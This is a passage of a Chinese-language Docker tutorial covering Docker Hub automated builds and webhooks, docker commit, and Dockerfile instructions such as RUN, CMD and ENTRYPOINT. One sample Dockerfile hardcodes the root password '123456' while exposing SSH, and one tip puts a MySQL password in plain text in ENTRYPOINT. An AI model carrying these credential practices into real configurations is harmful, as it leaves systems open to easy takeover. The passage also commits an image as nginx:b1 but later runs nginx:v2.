(2)在"储存库链接"部分中,输入图像储存库名称。远程存储库名称应该是官方存储库名称ubuntu或公共存储库名称namespace/repoName。
(3)按添加。
9、push dockerfile到github,再看dockerhub的Build Details会发现已经在Build镜像了,文档上说五分钟内提交的代码之后构建一次,其他的则会忽略)
状态:
Queued: 排队状态,队列时间取决于可用的并发构建数量。
Building: 图像正在建立中。
Success: 图像已经建成。
Error: image存在问题。点击该行进入Builds Details屏幕。页面顶部的横幅显示日志文件的最后一个句子,表示错误是什么。如果您需要更多信息,请滚动至屏幕底部至日志部分。

10、当镜像构建完毕变成success状态时 docker pull xxxx/xxxx 就已经可以看到已经在拉取镜像了,之后dockerfile更新了也只需要在服务器上面重新执行上面的命令就可以了,是不是方便多了

Webhooks 自动构建
因为Webhooks不区分仓库类型,就直接基于刚才创建的仓库进行分享了

1、Webhook是发送到提供服务的定义URL的POST请求。如果还没定义好,可以临时填写一个网址如http://baidu.com也可以,后期接口完成后再改),其它默认。点击save时,webhook会发送一个测试请求,用于测试url的有效性。测试通过后就成功的创建了一个webhook

2、Docker Hub向指定的URL发送的POST数据如下:
{
  "callback_url": "https://registry.hub.docker.com/u/svendowideit/testhook/hook/2141b5bi5i5b02bec211i4eeih0242eg11000a/",
  "push_data": {
    "images": [
        "27d47432a69bca5f2700e4dff7de0388ed65f9d3fb1ec645e2bc24c223dc1cc3",
        "51a9c7c1f8bb2fa19bcd09789a34e63f35abb80044bc10196e304f6634cc582c",
        "..."
    ],
    "pushed_at": 1.417566161e+09,
    "pusher": "trustedbuilder",
    "tag": "latest"
  },
  "repository": {
    "comment_count": 0,
    "date_created": 1.417494799e+09,
    "description": "",
    "dockerfile": "#\n# BUILD\u0009\u0009docker build -t svendowideit/apt-cacher .\n# RUN\u0009\u0009docker run -d -p 3142:3142 -name apt-cacher-run apt-cacher\n#\n# and then you can run containers with:\n# \u0009\u0009docker run -t -i -rm -e http_proxy http://192.168.1.2:3142/ debian bash\n#\nFROM\u0009\u0009ubuntu\n\n\nVOLUME\u0009\u0009[\/var/cache/apt-cacher-ng\]\nRUN\u0009\u0009apt-get update ; apt-get install -yq apt-cacher-ng\n\nEXPOSE \u0009\u00093142\nCMD\u0009\u0009chmod 777 /var/cache/apt-cacher-ng ; /etc/init.d/apt-cacher-ng start ; tail -f /var/log/apt-cacher-ng/*\n",
    "full_description": "Docker Hub based automated build from a GitHub repo",
    "is_official": false,
    "is_private": true,
    "is_trusted": true,
    "name": "testhook",
    "namespace": "svendowideit",
    "owner": "svendowideit",
    "repo_name": "svendowideit/testhook",
    "repo_url": "https://registry.hub.docker.com/u/svendowideit/testhook/",
    "star_count": 0,
    "status": "Active"
  }}

最后构建脚本进行一系列处理之后触发docker下载镜像等等命令,类似Git的钩子脚本一样)

</pre>
</div>

<div id="commit_build">
<h3>创建镜像</h3><pre>
镜像是容器的基础,每次执行docker run都会指定哪个镜像作为容器运行的基础。最常用的都是来自于Docker Hub的镜像,直接使用这些镜像是可以满足一定的需求,而当这些镜像无法直接满足需求时就需要定制这些镜像

镜像是多层存储,每一层是在前一层的基础上进行的修改;而容器同样也是多层存储,是在以镜像为基础层,在其基础上加一层作为容器运行时的存储层

当从docker镜像仓库中下载的镜像不能满足需求时,可以通过以下两种方式对镜像进行更改。

</pre>

<h4>1.从已经创建的容器中更新镜像并提交这个镜像</h4><pre>
docker commit命令除了学习之外,还有一些特殊的应用场合,比如被入侵后保存现场等。但不要使用docker commit定制镜像,定制镜像应该使用Dockerfile来完成

更新镜像之前需要使用镜像来创建一个容器。
~$ docker run -t -i ubuntu:15.10 /bin/bash

在运行的容器内使用apt update命令进行更新,在完成操作之后输入exit命令来退出这个容器。
此时ID为e218edb10161的容器是按需求更改的容器,可以通过命令docker commit来提交容器副本。
~$ docker commit -m="has update" -a="berlin" e218edb10161 runoob/ubuntu:v2
各个参数说明:
-m:提交的描述信息
-a:指定镜像作者
e218edb10161:容器ID
runoob/ubuntu:v2:指定要创建的目标镜像名

然后可以使用docker images命令来查看新镜像runoob/ubuntu:v2
~$ docker run -t -i runoob/ubuntu:v2 /bin/bash   # 使用新镜像runoob/ubuntu来启动一个容器

【 以定制一个Web服务器为例子讲解镜像是如何构建的 】
$ docker run --name webserver -d -p 80:80 nginx
用nginx镜像启动一个命名为webserver的容器,并映射80端口,然后可以用浏览器去访问这个nginx服务器,会看到默认的Nginx欢迎页面

如果是在Linux本机运行的Docker或Docker for Mac、Docker for Windows,那么可以直接访问http://localhost;如果使用的是Docker Toolbox或是在虚拟机、云服务器上安装的Docker,则需要将localhost换为虚拟机地址或实际云服务器地址。

现在希望改成欢迎Docker的文字,可以使用docker exec命令进入容器修改其内容。
$ docker exec -it webserver bash
root@3729b97e8226:/# echo 'hello from nginx container of docker' > /usr/share/nginx/html/index.html
root@3729b97e8226:/# exit

以交互式终端方式进入webserver容器,并执行了bash命令,也就是获得一个可操作的Shell。
然后用hello from nginx container of docker覆盖/usr/share/nginx/html/index.html的内容。现在再刷新浏览器会发现内容被改变了。

修改了容器的文件,也就是改动了容器的存储层,可以通过docker diff命令看到具体的改动。
$ docker diff webserver
C /root
A /root/.bash_history
C /run
A /run/nginx.pid
C /usr/share/nginx/html/index.html
C /var/cache/nginx
D /var/cache/nginx/client_temp
D /var/cache/nginx/fastcgi_temp
D /var/cache/nginx/proxy_temp
D /var/cache/nginx/scgi_temp
D /var/cache/nginx/uwsgi_temp

现在定制好了变化,希望能将其保存下来形成镜像。

当运行一个容器的时候(如果不使用卷的话),任何文件修改都会被记录于容器存储层里。而Docker提供了一个docker commit命令,可以将容器的存储层保存下来成为镜像。即在原有镜像的基础上,再叠加上容器的存储层构成新的镜像,以后运行这个新镜像的时候就会拥有原有容器最后的文件变化。

docker commit的语法格式为:
docker commit [选项] <容器ID或容器名> [<仓库名>[:<标签>]]
--author指定修改的作者,--message记录本次修改的内容。这点和git版本控制相似,不过这里这些信息可以省略留空

可以用下面的命令将容器保存为镜像:
$ docker commit --author "berlin75" --message "修改了默认网页" webserver nginx:b1
$ docker commit \
    --author "berlin75 < berlin75@gmail.com >" \
    --message "修改了默认网页" \
    webserver \
    nginx:b1


可以在docker image ls中看到这个新定制的镜像:
$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
nginx               b1                  cce4cd557dbd        7 seconds ago       109MB
nginx               latest              3c5a05123222        4 days ago          109MB
mysql               latest              8d99edb9fd40        13 days ago         445MB
ubuntu              latest              113a43faa138        4 weeks ago         81.2MB

还可以用docker history具体查看镜像内的历史记录,比较nginx:latest的历史记录,发现新增了刚刚提交的这一层。
$ docker history nginx:b1
IMAGE            CREATED            CREATED BY                                  SIZE        COMMENT
cce4cd557dbd   About a minute ago   nginx -g daemon off;                        595B       修改了默认网页
3c5a05123222     4 days ago      /bin/sh -c #(nop)  CMD ["nginx" "-g" "daemon…   0B
< missing >      4 days ago      /bin/sh -c #(nop)  STOPSIGNAL [SIGTERM]         0B
< missing >      4 days ago      /bin/sh -c #(nop)  EXPOSE 80/tcp                0B
< missing >      4 days ago      /bin/sh -c ln -sf /dev/stdout /var/log/nginx…   22B
< missing >      4 days ago      /bin/sh -c set -x  && apt-get update  && apt…   53.7MB
< missing >      4 days ago      /bin/sh -c #(nop)  ENV NJS_VERSION=1.15.1.0.…   0B
< missing >      4 days ago      /bin/sh -c #(nop)  ENV NGINX_VERSION=1.15.1-…   0B
< missing >      4 days ago      /bin/sh -c #(nop)  LABEL maintainer=NGINX Do…   0B
< missing >      13 days ago     /bin/sh -c #(nop)  CMD ["bash"]                 0B
< missing >      13 days ago     /bin/sh -c #(nop) ADD file:28fbc9fd012eef727…   55.3MB

新的镜像定制好后可以来运行这个镜像。
docker run --name web2 -d -p 81:80 nginx:v2

这里命名为新的服务为web2,并且映射到81端口。如果是Docker for Mac/Windows或Linux桌面就可以直接访问http://localhost:81看到结果,其内容应该和之前修改后的webserver一样。

至此第一次完成了定制镜像,使用的是docker commit命令,手动操作给旧的镜像添加了新的一层,形成新的镜像,对镜像多层存储应该有了更直观的感觉。

【 慎用docker commit 】
docker commit命令虽然可以比较直观的帮助理解镜像分层存储的概念,但实际环境中并不会这样使用。

首先观察之前的docker diff webserver的结果,发现除了真正想要修改的/usr/share/nginx/html/index.html文件外,由于命令的执行,还有很多文件被改动或添加了。这还仅仅是最简单的操作,如果是安装软件包、编译构建,那会有大量的无关内容被添加进来,如果不小心清理将会导致镜像极为臃肿。

而且回顾之前提及的镜像所使用的分层存储的概念,除当前层外之前的每一层都是不会发生改变的,即任何修改的结果仅仅是在当前层进行标记、添加、修改,而不会改动上一层。如果使用docker commit制作镜像以及后期修改的话,每一次修改都会让镜像更加臃肿一次,所删除的上一层的东西并不会丢失,会一直如影随形的跟着这个镜像,即使根本无法访问到,这会让镜像更加臃肿。

此外使用docker commit意味着所有对镜像的操作都是黑箱操作,生成的镜像也被称为黑箱镜像,即除了制作镜像的人知道执行过什么命令、怎么生成的镜像,别人根本无从得知。而且即使是这个制作镜像的人,过一段时间后也无法记清具体在操作的。虽然docker diff或许可以告诉得到一些线索,但是远远不到可以确保生成一致镜像的地步。这种黑箱镜像的维护工作是非常痛苦的。

</pre>

<h4>2.使用docker build指令来创建一个新的镜像,实现增量的修改和维护</h4><pre>
每个镜像都由很多层次构成,Docker使用Union FS将这些不同的层结合到一个镜像中去。
通常Union FS有两个用途,一方面可以实现不借助LVM、RAID将多个disk挂到同一个目录下,另一个更常用的就是将一个只读的分支和一个可写的分支联合在一起,Live CD正是基于此方法可以允许在镜像不变的基础上允许用户在其上进行一些写操作。
Docker在AUFS上构建的容器也是利用了类似的原理

使用docker build命令从零开始来创建一个新的镜像,为此需要创建一个Dockerfile文件,其中包含一组指令来告诉Docker如何构建镜像
镜像的定制实际上就是定制每一层所添加的配置、文件。如果把每一层修改、安装、构建、操作的命令都写入一个脚本,用这个脚本来构建、定制镜像,那么之前提及的无法重复的问题、镜像构建透明性的问题、体积的问题就都会解决,这个脚本就是Dockerfile

【 Dockerfile 】
Dockerfile是一个文本文件,Docker通过读取Dockerfile中的指令自动生成映像
包含了一条条的指令(Instruction),每一条指令都会在镜像上创建一个新的层,因此每一条指令的内容就是描述该层应当如何构建

Dockerfile一般分为四部分：基础镜像信息、维护者信息、镜像操作指令和容器启动时执行指令
以＃字符开头为Dockerfile中的注释
每一个指令的前缀都必须是大写的
Docker以从上到下的顺序运行Dockerfile的指令

【 实例: Docker部署Node应用 】
~$ cat Dockerfile
FROM node:10.13-alpine #项目的基础依赖
MAINTAINER chenLong #项目维护者
COPY . . #将本机根目录所有文件拷贝到容器的根目录下
EXPOSE 3000 #容器对外暴露的端口
RUN npm i #安装node依赖
CMD npm start #在容器环境里执行的命令

~$ cat index.js
const Koa = require('koa');
const app = new Koa();
app.use(async ctx => {
  ctx.body = 'Hello Docker O(∩_∩)O~~';
});
app.listen(3000);

npm init -y
npm i koa
node index.js  // 本地调试
运行localhost:3000
docker build -t docker-demo/hello-docker:v1 .
docker images
docker run -i -t -p 8080:3000 docker-demo/hello-docker:v1
运行localhost:8080

【 实例: Docker部署Node应用 】
设置国内镜像,Registry mirrors https://registry.docker-cn.com
docker pull node:latest
docker images

~$ cat Dockerfile
FROM node:latest   #  使用最新的node镜像
WORKDIR /home/app  #  设置工作目录为/home/app
COPY . .           #  把当前目录下的文件全部复制到工作目录下面
RUN npm install    #  在工作目录下面运行 npm install
expose 8080        #  暴露8080端口,这个8080端口就是npm run serve的端口)
CMD npm run serve  #  在cmd里面使用npm run serve命令,这里需要用自己项目中的命令

~$ cat .dockerignore  # 不需要把node_modules里面的文件复制到docker里面去
node_modules

# 使用刚才建立好的 Dockerfile 文件给项目进行打包,建立一个镜像文件：
docker build -t docker-app:latest .

# 用这个镜像文件创建一个实例并运行。
# -d后台运行,-p 2001:8080把docker的8080端口连接到本机的2001端口,以后就可以通本机的2001端口访问docker的8080端口,打开localhost:2001即可
docker run -d -p 2001:8080 docker-app 

【 实例 】
~$ cat Dockerfile
FROM    centos:6.7
MAINTAINER      Fisher "fisher@sudops.com"
RUN     /bin/echo 'root:123456' |chpasswd
RUN     useradd runoob
RUN     /bin/echo 'runoob:123456' |chpasswd
RUN     /bin/echo -e "LANG=\"en_US.UTF-8\"" >/etc/default/local
EXPOSE  22
EXPOSE  80
CMD     /usr/sbin/sshd -D

~$ docker build -t runoob/centos:6.7 .
参数说明:
-t :指定要创建的目标镜像名
. :Dockerfile文件所在目录,可指定Dockerfile的绝对路径

使用docker tag命令为镜像添加一个新的标签
docker tag IMAGE[:TAG] [REGISTRY_HOST[:REGISTRY_PORT]/]REPOSITORY[:TAG]

~$ docker tag 860c279d2fec runoob/centos:dev
docker tag 镜像ID,这里是860c279d2fec,用户名称、镜像源名(repository name)和新的标签名(tag)

$ mkdir mynginx
$ cd mynginx
$ cat << EOF > Dockerfile
> FROM nginx
> RUN echo 'Hello, Docker!' > /usr/share/nginx/html/index.html

准则
1、尽量将Dockerfile放在空目录中,如果目录中必须有其他文件则使用.dockerignore文件。
2、避免安装不必须的包。
3、每个容器应该只关注一个功能点。
4、最小化镜像的层数。
5、多行参数时应该分类,这样更清晰直白,便于阅读和review,另外在每个换行符\前都增加一个空格。
6、对构建缓存要有清楚的认识。

【 FROM指令指定基础镜像 】
一个Dockerfile中FROM是必备的指令,并且必须是除了注释以外的第一条指令。

Docker Store上有非常多的高质量的官方镜像,有可以直接拿来使用的服务类镜像,如nginx、redis、mongo、mysql、httpd、php、tomcat等;也有一些方便开发、构建、运行各种语言应用的镜像,如node、openjdk、python、ruby、golang等。可以在其中寻找一个最符合最终目标的镜像为基础镜像进行定制。
如果没有找到对应服务的镜像,官方镜像中还提供了一些更为基础的操作系统镜像,如ubuntu、debian、centos、fedora、alpine等,这些操作系统的软件库提供了更广阔的扩展空间。

FROM scratch
除了选择现有镜像为基础镜像外,Docker还存在一个名为scratch的特殊的镜像,这个镜像是虚拟的概念,并不实际存在,表示一个空白的镜像
如果以scratch为基础镜像的话,意味着不以任何镜像为基础,接下来所写的指令将作为镜像第一层开始存在。
不以任何系统为基础,直接将可执行文件复制进镜像的做法并不罕见,比如swarm、coreos/etcd。对于Linux下静态编译的程序来说,并不需要有操作系统提供运行时支持,所需的一切库都已经在可执行文件里了,因此直接FROM scratch会让镜像体积更加小巧。使用Go语言开发的应用很多会使用这种方式来制作镜像,这也是为什么有人认为 Go是特别适合容器微服务架构的语言的原因之一。

【 MAINTAINER指令 】
第二条指令MAINTAINER用来标明这个镜像的维护者信息

【 LABEL指令 】
可以给镜像添加标签来帮助组织镜像、记录许可信息、辅助自动化构建等。每个标签一行由LABEL开头加上一个或多个标签对
如果字符串中包含空格,必须将字符串放入引号中或对空格使用转义,如果字符串内容本身就包含引号,必须对引号使用转义。

LABEL com.example.version="0.0.1-beta"
LABEL vendor="ACME Incorporated"
LABEL com.example.release-date="2015-02-12"
LABEL com.example.version.is-production=""

一个镜像可以包含多个标签,但建议将多个标签放入到一个LABEL指令中。
LABEL vendor=ACME\ Incorporated \
      com.example.is-beta= \
      com.example.is-production="" \
      com.example.version="0.0.1-beta" \
      com.example.release-date="2015-02-12"

【 RUN指令执行命令 】
RUN指令是用来在docker的编译环境中运行执行命令行命令的,其格式有两种:
RUN指令创建的中间镜像会被缓存,并会在下次构建中使用。如果不想使用这些缓存镜像,可以在构建时指定--no-cache参数,如：docker build --no-cache

1、shell格式
RUN <命令>,就像直接在命令行中输入的命令一样
RUN echo 'Hello, Docker!' > /usr/share/nginx/html/index.html
这条指令会在编译环境运行/bin/sh -c "echo 'Hello, Docker!' > /usr/share/nginx/html/index.html"

2、exec格式
RUN ["可执行文件", "参数1", "参数2"],这更像是函数调用中的格式。
这种格式运行程序可免除运行/bin/sh的消耗,使用Json格式将程序名与所需参数组成一个字符串数组,所以如果参数中有引号等特殊字符则需要进行转义

既然RUN就像Shell脚本一样可以执行命令,那么是否就可以像Shell脚本一样把每个命令对应一个RUN呢？比如这样:

FROM debian:jessie
RUN apt update
RUN apt install -y gcc libc6-dev make
RUN wget -O redis.tar.gz "http://download.redis.io/releases/redis-3.2.5.tar.gz"
RUN mkdir -p /usr/src/redis
RUN tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1
RUN make -C /usr/src/redis
RUN make -C /usr/src/redis install

Dockerfile中每一个指令都会建立一层,RUN也不例外。每一个RUN的行为就和手工建立镜像的过程一样:新建立一层,在其上执行这些命令,执行结束后,commit这一层的修改,构成新的镜像。

而上面的这种写法,创建了7层镜像。这是完全没有意义的,而且很多运行时不需要的东西都被装进了镜像里,比如编译环境、更新的软件包等,结果就是产生非常臃肿、非常多层的镜像,不仅增加了构建部署的时间,也很容易出错

Union FS是有最大层数限制的,比如AUFS不得超过127层

上面的Dockerfile正确的写法:
FROM debian:jessie
RUN buildDeps='gcc libc6-dev make' \
    && apt update \
    && apt install -y $buildDeps \
    && wget -O redis.tar.gz "http://download.redis.io/releases/redis-3.2.5.tar.gz" \
    && mkdir -p /usr/src/redis \
    && tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1 \
    && make -C /usr/src/redis \
    && make -C /usr/src/redis install \
    && rm -rf /var/lib/apt/lists/* \
    && rm redis.tar.gz \
    && rm -r /usr/src/redis \
    && apt-get purge -y --auto-remove $buildDeps

首先之前所有的命令只有一个目的就是编译、安装redis可执行文件,因此没有必要建立很多层,这只是一层的事情。因此这里没有使用很多个RUN对一一对应不同的命令,而是仅仅使用一个RUN指令,并使用&&将各个所需命令串联起来。将之前的7层简化为了1层。在撰写Dockerfile的时候要经常提醒自己,这并不是在写Shell脚本,而是在定义每一层该如何构建。

Dockerfile支持Shell类的行尾添加\的命令换行方式及行首#进行注释的格式。良好的格式如换行、缩进、注释等会让维护、排障更为容易,这是一个好的习惯。

这一组命令的最后添加了清理工作的命令,删除为编译构建所需要的软件,清理所有下载、展开的文件、apt缓存文件。这是很重要的一步,镜像是多层存储,每一层的东西并不会在下一层被删除,会一直跟随着镜像。因此镜像构建时一定要确保每一层只添加真正需要添加的东西,任何无关的东西都应该清理掉。

【 apt在基于Ubuntu基础镜像Dockerfile中的常见用法 】
1、不要使用RUN apt-get upgrade或dist-upgrade,因为许多基础镜像中的必须包不会在一个非特权容器中升级。如果基础镜像中的某个包过时了,应该联系它的维护者。如果确定某个特定的包比如foo需要升级,使用apt-get install -y foo就行,该指令会自动升级foo包

2、永远将RUN apt update和apt install组合成一条RUN声明

RUN apt update && apt install -y --no-install-recommends wget s3cmd=1.1.* && rm -rf /var/lib/apt/lists/*

RUN apt-get update && apt-get install -y \
    aufs-tools \
    automake \
    build-essential \
    curl \
    dpkg-sig \
    libcap-dev \
    libsqlite3-dev \
    mercurial \
    reprepro \
    ruby1.9.1 \
    ruby1.9.1-dev \
    s3cmd=1.1.* \
 && rm -rf /var/lib/apt/lists/*

在Ubuntu的Docker官方镜像中是没有缓存Apt的软件包列表,因此在做其他任何基础软件的安装前都需要至少先做一次apt update。
有时为了加快apt-get安装软件的速度,还需要修改Apt源的列表文件/etc/apt/sources.list。相应的操作用命令表示如下:
# 使用Ubuntu官方的Apt源,也可以根据实际需要修改为国内源的地址
echo "deb http://archive.ubuntu.com/ubuntu trusty main universe\n" > /etc/apt/sources.list
echo "deb http://archive.ubuntu.com/ubuntu trusty-updates main universe\n" >> /etc/apt/sources.list

在容器构建时,为避免使用apt install安装基础软件的过程中需要进行交互操作,使用-y参数来避免安装非必须的文件,来减小镜像的体积
apt-get -y --no-install-recommends install

DEBIAN_FRONTEND环境变量告知操作系统应该从哪儿获得用户输入。如果设置为"noninteractive"就可以直接运行命令,而无需向用户请求输入(所有操作都是非交互式的)。这在运行apt命令的时候格外有用,因为它会不停的提示用户进行到了哪步并且需要不断确认。非交互模式会选择默认的选项并以最快的速度完成构建。
请确保只在Dockerfile中调用的RUN命令中设置了该选项,而不是使用ENV命令进行全局的设置。因为ENV命令在整个容器运行过程中都会生效,所以当通过BASH和容器进行交互时,如果进行了全局设置那就会出问题。

# 正确的做法 - 只为这个命令设置ENV变量
RUN DEBIAN_FRONTEND=noninteractive apt install -y python3
# 错误地做法 - 为接下来的任何命令都设置ENV变量,包括正在运行地容器
ENV DEBIAN_FRONTEND noninteractive
RUN apt install -y python3

示例如下:
FROM ubuntu:trusty
MAINTAINER mryqu
RUN \
 DEBIAN_FRONTEND=noninteractive apt-get update && \
 DEBIAN_FRONTEND=noninteractive apt-get -y install wget curl && \
 DEBIAN_FRONTEND=noninteractive apt-get -y autoremove && \
 DEBIAN_FRONTEND=noninteractive apt-get clean

备份 cp /etc/apt/sources.list /etc/apt/sources.list.backup

使用apt autoremove命令移除为了满足包依赖而安装的、但不再需要的包;
使用apt clean命令清除所获得包文件的本地仓库,官方的Debian和Ubuntu镜像会自动运行apt-get clean,所以不需要显式的调用apt-get clean

将apt-get update放在一条单独的RUN声明中会导致缓存问题及后续的apt-get install失败
假设有一个Dockerfile文件:
FROM ubuntu:14.04
RUN apt-get update
RUN apt-get install -y curl
构建镜像后,所有的层都在Docker的缓存中。假设后来又修改了其中的apt-get install添加了一个包:
FROM ubuntu:14.04
RUN apt-get update
RUN apt-get install -y curl nginx
Docker发现修改后的RUN apt-get update指令和之前的完全一样。所以apt-get update不会执行,而是使用之前的缓存镜像。因为apt-get update没有运行,后面的apt-get install可能安装的是过时的curl和nginx版本。

使用RUN apt-get update && apt-get install -y可以确保Dockerfiles每次安装的都是包的最新的版本,而且这个过程不需要进一步的编码或额外干预。这项技术叫作cache busting。
也可以显示指定一个包的版本号来达到cache-busting,这就是所谓的固定版本,例如:
RUN apt-get update && apt-get install -y \
    package-bar \
    package-baz \
    package-foo=1.3.*
固定版本会迫使构建过程检索特定的版本,而不管缓存中有什么。这项技术也可以减少因所需包中未预料到的变化而导致的失败。

$ apt install net-tools       # 安装ifconfig命令
$ apt install inetutils-ping  # 安装ping命令
$ apt install initscripts     # 安装service命令
$ apt install procps          # 安装ps命令

3、管道使用
很多RUN命令都需要使用到管道,如:
RUN wget -O - https://some.site | wc -l > /number
Docker使用/bin/sh -c解释器来执行这些命令,该解释器只评估管道最后一个操作的返回值来判断整个命令是否成功。在上面的例子中,只要wc -l命令成功了,即使wget命令失败了,也会创建一个新镜像。为了避免上述情况,可以在语句首部加上set -o pipefail &&。比如:
RUN set -o pipefail && wget -O - https://some.site | wc -l > /number

但并非所有的shell都支持-o pipefail选项,比如说基于Debian的镜像下的模式shell:dash shell。这种情况下可以使用exec格式的RUN命令来显示地选择shell来支持pipefail选项
RUN ["/bin/bash", "-c", "set -o pipefail && wget -O - https://some.site | wc -l > /number"]

【 CMD指令 容器启动命令 】
这是整个Dockerfile脚本的最后一条指令。当Dockerfile已经完成了所有环境的安装与配置,通过CMD指令来指示docker run命令运行镜像时要执行的命令
Docker不是虚拟机,容器就是进程。既然是进程,那么在启动容器的时候需要指定所运行的程序及参数。CMD指令就是用于指定默认的容器主进程的启动命令的。

CMD指令的格式和RUN相似,也是两种格式:
shell格式:CMD <命令>
exec格式:CMD ["可执行文件", "参数1", "参数2"...]
参数列表格式:CMD ["参数1", "参数2"...]。在指定了ENTRYPOINT指令后,用CMD指定具体的参数。

在运行时可以指定新的命令来替代镜像设置中的这个默认命令,比如ubuntu镜像默认的CMD是/bin/bash,如果直接docker run -it ubuntu会直接进入bash。也可以在运行时指定运行别的命令,如docker run -it ubuntu cat /etc/os-release。这就是用cat /etc/os-release命令替换了默认的/bin/bash命令而是输出了系统版本信息。

在指令格式上一般推荐使用exec格式,这类格式在解析时会被解析为JSON数组,因此一定要使用双引号,而不要使用单引号。

如果使用shell格式的话,实际的命令会被包装为sh -c的参数的形式进行执行
CMD echo $HOME
在实际执行中,会将其变更为:
CMD [ "sh", "-c", "echo $HOME" ]
这就是为什么可以使用环境变量的原因,因为这些环境变量会被shell进行解析处理。

容器中应用在前台执行和后台执行的问题
Docker不是虚拟机,容器中的应用都应该以前台执行,而不是像虚拟机、物理机里面那样用upstart/systemd去启动后台服务,容器内没有后台服务的概念。

将CMD写为:CMD service nginx start然后发现容器执行后就立即退出,甚至在容器内去使用systemctl命令结果却发现根本执行不了。这就是因为没有搞明白前台、后台的概念,没有区分容器和虚拟机的差异,依旧在以传统虚拟机的角度去理解容器。

对于容器而言,其启动程序就是容器应用进程,容器就是为了主进程而存在的,主进程退出,容器就失去了存在的意义从而退出,其它辅助进程不是它需要关心的

而使用service nginx start命令则是希望以后台守护进程形式启动nginx服务。而CMD service nginx start会被理解为CMD [ "sh", "-c", "service nginx start"],因此主进程实际上是sh。当service nginx start命令结束后sh也就结束了,sh作为主进程退出了自然就会令容器退出。

正确的做法是直接执行nginx可执行文件,并且要求以前台形式运行
CMD ["nginx", "-g", "daemon off;"]

【 ENTRYPOINT 入口点 】
ENTRYPOINT的格式和RUN指令格式一样,分为exec格式和shell格式
ENTRYPOINT ["程序名", "参数1", "参数2"]
ENTRYPOINT 命令 参数1 参数2

ENTRYPOINT的最佳用处是设置镜像的主命令,允许将镜像当成命令本身来运行,用CMD提供默认选项

下面的示例镜像提供了命令行工具 s3cmd:
ENTRYPOINT ["s3cmd"]
CMD ["--help"]
现在直接运行该镜像创建的容器会显示命令帮助:
$ docker run s3cmd
或者提供正确的参数来执行某个命令:
$ docker run s3cmd ls s3://mybucket
这样镜像名可以当成命令行的参考。

ENTRYPOINT指令也可以结合一个辅助脚本使用,和前面命令行风格类似,即使启动工具需要不止一个步骤。

例如,Postgres官方镜像使用下面的脚本作为ENTRYPOINT,该脚本使用Bash的内置命令exec,所以最后运行的进程就是容器的PID为1的进程,这样进程就可以接收到任何发送给容器的Unix信号了
#!/bin/bash
set -e
if [ "$1" = 'postgres' ]; then
    chown -R postgres "$PGDATA"
    if [ -z "$(ls -A "$PGDATA")" ]; then
        gosu postgres initdb
    fi
    exec gosu postgres "$@"
fi
exec "$@"

该辅助脚本被拷贝到容器,并在容器启动时通过ENTRYPOINT执行:
COPY ./docker-entrypoint.sh /
ENTRYPOINT ["/docker-entrypoint.sh"]

该脚本可以让用户用几种不同的方式和Postgres交互。
可以很简单地启动Postgres:
$ docker run postgres
也可以执行Postgres并传递参数:
$ docker run postgres postgres --help
最后还可以启动另外一个完全不同的工具,比如Bash:
$ docker run --rm -it postgres bash

ENTRYPOINT的目的和CMD一样,都是在指定容器的启动程序及参数。
ENTRYPOINT在运行时也可以替代,不过比CMD要略显繁琐,需要通过docker run的参数--entrypoint来指定。

ENTRYPOINT是容器运行程序的入口,即在docker run命令中指定的命令都将作为参数提供给ENTRYPOINT指定的程序。CMD 命令 参数1 参数2,CMD 参数1 参数2这两种CMD指令格式将作为参数提供给ENTRYPOINT指定的程序,CMD ["程序名", "参数1", "参数2"]除外

默认的ENTRYPOINT是/bin/sh -c,可根据实际需要任意设置,如果在一个Dockerfile中出现多个ENTRYPOINT指令,那么只有最后一个ENTRYPOINT指令起效

一种常用的设置是将命令与必要参数设置到ENTRYPOINT中,而运行时只提供其他选项。例如MySQL的客户端程序运行在容器中,而客户端所需要的主机地址、用户名和密码不希望每次都输入,就可以将ENTRYPOINT设置成:ENTRYPOINT mysql -u 用户名 -p 密码 -h 主机名,而运行时只需要指定数据库名

指定了ENTRYPOINT后,CMD的含义就发生了改变,不再是直接的运行其命令,而是将CMD的内容作为参数传给ENTRYPOINT指令,即实际执行时将变为:
< ENTRYPOINT > "< CMD >"
那么有了CMD后,为什么还要有ENTRYPOINT呢？

场景一:让镜像变成像命令一样使用
假设需要一个得知自己当前公网IP的镜像,那么可以先用CMD来实现:

FROM ubuntu:16.04
RUN apt update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*
CMD [ "curl", "-s", "http://ip.cn" ]

假如使用docker build -t myip .来构建镜像的话,如果需要查询当前公网IP,只需要执行:
$ docker run myip
当前 IP:106.17.42.163 来自:湖南省长沙市 电信

这么看起来好像可以直接把镜像当做命令使用了,不过命令总有参数,如果希望加参数呢？比如从上面的CMD中可以看到实质的命令是curl,那么如果希望显示HTTP头信息就需要加上-i参数,那么可以直接加-i参数给docker run myip么？

$ docker run myip -i
docker: Error response from daemon: invalid header field value "oci runtime error: container_linux.go:247: starting container process caused \"exec: \\\"-i\\\": executable file not found in $PATH\"\n".

可以看到可执行文件找不到的报错,executable file not found。
跟在镜像名后面的是command,运行时会替换CMD的默认值。因此这里的-i替换了原来的CMD,而不是添加在原来的curl -s http://ip.cn后面。而-i根本不是命令,所以自然找不到。

那么如果希望加-i这参数,就必须重新完整的输入这个命令:
$ docker run myip curl -s http://ip.cn -i

这显然不是很好的解决方案,而使用ENTRYPOINT就可以直接使用docker run myip -i
FROM ubuntu:16.04
RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*
ENTRYPOINT [ "curl", "-s", "http://ip.cn" ]

这是因为当存在ENTRYPOINT后,CMD的内容将会作为参数传给ENTRYPOINT,而这里-i就是新的CMD,因此会作为参数传给curl

场景二:应用运行前的准备工作
启动容器就是启动主进程,但有时启动主进程前需要一些准备工作
比如mysql类的数据库可能需要一些数据库配置、初始化的工作,这些工作要在最终的mysql服务器运行之前解决。
此外可能希望避免使用root用户去启动服务从而提高安全性,而在启动服务前还需要以root身份执行一些必要的准备工作,最后切换到服务用户身份启动服务。或者除了服务外,其它命令依旧可以使用root身份执行,方便调试等。

这些准备工作是和容器CMD无关的,无论CMD是什么都需要事先进行一个预处理的工作。这种情况下可以写一个脚本,然后放入ENTRYPOINT中去执行,而这个脚本会将接到的参数(也就是CMD)作为命令,在脚本最后执行。比如官方镜像redis中就是这么做的:

FROM alpine:3.4
...
RUN addgroup -S redis && adduser -S -G redis redis
...
ENTRYPOINT ["docker-entrypoint.sh"]

EXPOSE 6379
CMD [ "redis-server" ]

